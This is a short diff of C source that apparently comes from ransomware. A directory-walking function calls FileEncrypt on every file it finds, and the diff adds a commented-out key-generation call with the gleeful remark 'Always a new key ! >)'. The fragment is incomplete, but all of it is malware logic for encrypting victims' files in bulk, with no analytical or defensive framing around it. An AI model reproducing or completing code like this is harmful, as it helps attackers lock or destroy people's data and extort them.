@@ -77,6 +77,7 @@ void FindDir(unsigned char * path, unsigned char * mask) {
     strcpy(pathfile, path);
     strcat(pathfile, slash);
     strcat(pathfile, wfd.cFileName);
+    //GenerateKey(); // Always a new key ! >) 
     FileEncrypt(pathfile);
    }
   } while (FindNextFile(hfound, &wfd));
